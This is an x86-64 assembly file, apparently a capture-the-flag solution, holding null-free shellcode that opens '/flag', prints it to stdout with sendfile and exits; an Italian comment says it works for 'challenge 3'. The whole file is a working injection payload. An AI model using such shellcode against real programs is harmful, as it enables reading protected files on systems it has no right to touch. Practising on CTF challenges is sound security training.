.global _start
.intel_syntax noprefix
_start:
    #open
    xor rax, rax            
    mov al, 0x67            
    shl rax, 0x20
    xor rbx, rbx
    mov ebx, 0x616c662f
    add rbx, rax
    push rbx
    xor rax, rax
    mov al, 2
    mov rdi, rsp
    xor rsi, rsi
    syscall

    #sendfile
    xor rdi, rdi
    inc rdi
    mov rsi, rax
    xor rdx, rdx
    xor rax, rax
    mov al, 0xff
    mov r10, rax
    xor rax, rax
    mov al, 0x28
    syscall

    #exit
    xor rax, rax
    mov al, 0x3c
    syscall

# apre il file flag e lo stampa con sendfile, il tutto non usando i null, funziona per 
# challenge 3